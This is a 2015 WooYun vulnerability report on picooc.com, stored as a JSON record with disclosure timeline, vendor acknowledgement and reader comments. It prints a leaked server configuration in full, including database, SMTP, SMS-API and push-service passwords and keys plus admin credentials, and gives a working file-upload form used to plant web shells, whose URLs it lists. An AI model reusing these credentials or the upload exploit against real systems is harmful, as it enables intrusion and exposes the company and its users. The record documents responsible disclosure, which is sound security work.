{"id": 5935, "wybug_id": "wooyun-2015-0123721", "wybug_title": "有品网某配置不当导致官网沦陷(service@picooc.com账号已被劫持)", "wybug_corp": "picooc.com", "wybug_author": "mango", "wybug_date": "2015-06-30 17:09", "wybug_open_date": "2015-08-14 17:12", "wybug_type": "应用配置错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向公众公开  简要描述： 有品 详细说明：  .svn泄漏 http://www.picooc.com/.svn/entrieshttp://bbs.picooc.com/.svn/entries泄漏很多东西 包括 mysql账号 发现 所有账号密码都一样的\n['user']       = 'admin';  ]['password']   = 'picooc_1+1!=3';\n\n\n\n<?php/*****************数据库配置*****************/ $config['mysql']['host']       = 'picooc03';\t\t\t// MYSQL 服务器IP地址 $config['mysql']['port']       = 3306;\t\t\t\t\t\t\t// '' 为默认端口 3305 $config['mysql']['db']         = 'picooc';\t\t\t// 数据库名 $config['mysql']['user']       = 'admin';     \t\t\t\t// MYSQL 用户名 $config['mysql']['password']   = 'picooc_1+1!=3';\t\t\t\t// MYSQL 用户口令   $config['mysql']['host_dev']       = 'picooc03';\t\t\t// MYSQL 服务器IP地址 $config['mysql']['port_dev']       = 3306;\t\t\t\t\t\t\t// '' 为默认端口 3305 $config['mysql']['db_dev']         = 'picooc_dev';\t\t\t// 数据库名 $config['mysql']['user_dev']       = 'admin';     \t\t\t\t// MYSQL 用户名 $config['mysql']['password_dev']   = 'picooc_1+1!=3';\t\t\t\t// MYSQL 用户口令  $config['mysql']['db_address']         = 'address';\t\t\t// 获取IP地址的数据库名  $config['mysql']['pre'] = 'v2_';    //表前缀 /*****************************************/  /** * memcache配置 */$config['memcache']['host'] = 'picooc03';$config['memcache']['port'] = '11211';/** * SMTP配置 */$config['smtp']['server'] = 'smtp.exmail.qq.com';$config['smtp']['port'] = 25;$config['smtp']['useremail'] = 'service@picooc.com'; //发信人的email$config['smtp']['password'] = 'picooc201312'; //发信人的email密码$config['smtp']['mailfrom'] = 'PICOOC'; //发送人/** * 百度推送 */$config['baidu_push_dev']['app_id'] = '1706572';$config['baidu_push_dev']['app_key'] = '7Y4L3bMxLgil7WbPuDyaaPCa';$config['baidu_push_dev']['secrect_key'] = 'duGlkwl72jGEfu5hgKQsXbVgF8XVrWQ1';$config['baidu_push_dev']['deploy_status'] = 1; //1为开发版 2为正式版$config['baidu_push_dev']['alert_sound'] = 'latin.m4r';$config['baidu_push']['app_id'] = '1706572';$config['baidu_push']['app_key'] = '7Y4L3bMxLgil7WbPuDyaaPCa';$config['baidu_push']['secrect_key'] = 'duGlkwl72jGEfu5hgKQsXbVgF8XVrWQ1';$config['baidu_push']['deploy_status'] = 2; //1为开发版 2为正式版$config['baidu_push']['alert_sound'] = 'latin.m4r';/** * 百度restful接口 */$config['baidu_rest']['access_token_lifetime'] = 86400*365; //三个月$config['baidu_rest']['table_url'] = 'https://pcs.baidu.com/rest/2.0/structure/table';/** * 短信验证码 */$config['sudas_sms']['notice_no'] = '13501327047';$config['sudas_sms']['notice_num'] = 2000;$config['sudas_sms']['sn'] = 'SDK-KEY-010-00095';$config['sudas_sms']['pwd'] = 'c9@dcff@';$config['sudas_sms']['sign'] = '【有品】';$config['sudas_sms']['url'] = 'http://sdk2.sudas.cn:8060/z_mdsmssend.aspx';$config['sudas_sms']['balance_url'] = 'http://sdk2.sudas.cn:8060/z_balance.aspx';$config['sudas_sms']['content'] = '（PICOOC验证码），为了保护您的帐号安全，验证短信请勿转发给其他人'.$config['sudas_sms']['sign'];$config['sudas_sms']['balance_content'] = '短信验证码余量已到警戒线，请尽快充值'.$config['sudas_sms']['sign'];/** * 短信验证码 云通讯 */$config['yuntongxun_sms']['account_sid'] = '8a48b55149e0e7a20149ea0a51470597';$config['yuntongxun_sms']['auth_token'] = 'ac3abfaaf4314b9c99be0e830f5a96c3';$config['yuntongxun_sms']['url'] = 'app.cloopen.com';$config['yuntongxun_sms']['sandbox_url'] = 'sandboxapp.cloopen.com';$config['yuntongxun_sms']['sdk_version'] = '2013-12-26';$config['yuntongxun_sms']['port'] = 8883;$config['yuntongxun_sms']['template_id'] = 9121;$config['yuntongxun_sms']['sandbox_template_id'] = 9121;$config['yuntongxun_sms']['app_id'] = 'aaf98f8949e0e5ac0149ea0ebd320562';/** * 消息队列 */$config['msq']['host'] = 'picooc01';$config['msq']['port'] = '1218';$config['msq']['queue_name'] = 'picooc_msq';$config['msq']['queue_retry_name'] = 'picooc_retry_msq';$config['msq']['password'] = 'picooc';/** * 百度LBS token */$config['baidu_lbs']['url'] = 'http://api.map.baidu.com/location/ip';$config['baidu_lbs']['token'] = 'D48b6ea3d99e9321a52639f8d2d5c381';/** * 网站单点登录配置信息 */$config['portal']['url'] = \"www.picooc.com\";//网站url$config['portal']['encrypt'] = array('cipher'=>MCRYPT_RIJNDAEL_128,'mode'=>MCRYPT_MODE_CBC,'key'=>'picooc2014');//对称加密配置信息/** * latin购买链接 */$config['buy_url']['latin']['jd'] = 'http://m.jd.com/product/1257159.html';/** * 手机号邮箱验证正则过滤 '/^13\\d{9}$|^170\\d{8}$|^15[0|1|2|3|5|6|7|8|9]\\d{8}$|^18[0|1|2|3|5|6|7|8|9]\\d{8}$|^14[5|7]\\d{8}$/'; */$config['pattern']['phone_no'] = '/^1[3|4|5|6|7|8|9]\\d{9}$/';$config['pattern']['email'] = \"/^([a-z0-9_\\-\\.]+)@(([a-z0-9]+[_\\-]?)\\.)+[a-z]{2,3}$/i\";/** * 版本更新 */$config['version']['android'] = '25';i7gaI179H0JelaIdj1rec2r8uei8t2h142rasb71xam8L4a3gb90e6Lcg0Z3l53a$config['version']['ios'] = '2.0';\n泄漏很多问题 包括service@picooc.com 服务密码\n\n\n\n115.28.58.73106.2.211.86都支持外联都是上面的密码\n\n在数据库翻到了 官网后台密码http://www.picooc.com/cmsadmin/picooc pic\n\n后台不能上传很蛋疼 但是http://test.picooc.com 这是官网的备份站他可以起上传而且后台密码都可以登录\n\nck编辑器任意上传~~http://test.picooc.com/upload/20150630/102.php -7\n\n   漏洞证明：  虽然是备份站 和官网源码还是一样的 经过分析发现http://www.picooc.com/picooc/up/index.php存在任意上传 \n\nsign要根据路径来变构造上传点\n<form enctype=\"multipart/form-data\" action=\"http://www.picooc.com/picooc/up/index.php?sign=D3F5CE9E79DE5F841F0EA8DC2FCA1A5B\" method=\"post\" >    <input type=\"file\" name=\"file\">    <input type=\"submit\" value=\"ok\"></form>\n得到shellhttp://www.picooc.com//picooc//upload//20150630//296240.php c3\n\n站点很多就不一一说了\n\n   修复方案：     版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-30 17:11 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-30 16:52 |    \t\tIceKing \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 道行尚浅)\t\t \n  神器啊，这一天挖多少洞啊>..<    \n     2015-06-30 19:05 |    \t\t邓先生 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 其实，打你就像划小船)\t\t \n  好快    \n     2015-08-15 11:04 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @mango ck任意文件上传。。是单个站还是某个版本。、。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}